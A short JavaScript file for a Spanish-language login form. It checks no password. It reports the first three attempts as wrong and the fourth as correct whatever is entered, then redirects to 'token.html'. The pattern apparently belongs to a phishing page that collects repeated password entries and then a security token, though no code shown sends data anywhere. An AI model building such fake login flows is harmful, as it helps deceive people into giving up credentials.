let intentos = 0;
const maxIntentos = 4;

document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault();

    const mensaje = document.getElementById("mensajeLogin");

    intentos++;

    if(intentos < maxIntentos){
        mensaje.style.color = "#c0392b";
        mensaje.textContent = "Contraseña incorrecta, intenta de nuevo";
    } else {
        mensaje.style.color = "#27ae60";
        mensaje.textContent = "Contraseña correcta";
        
        setTimeout(() => {
            window.location.href = "token.html";
        }, 1000); // espera 1 segundo antes de redirigir
    }
});
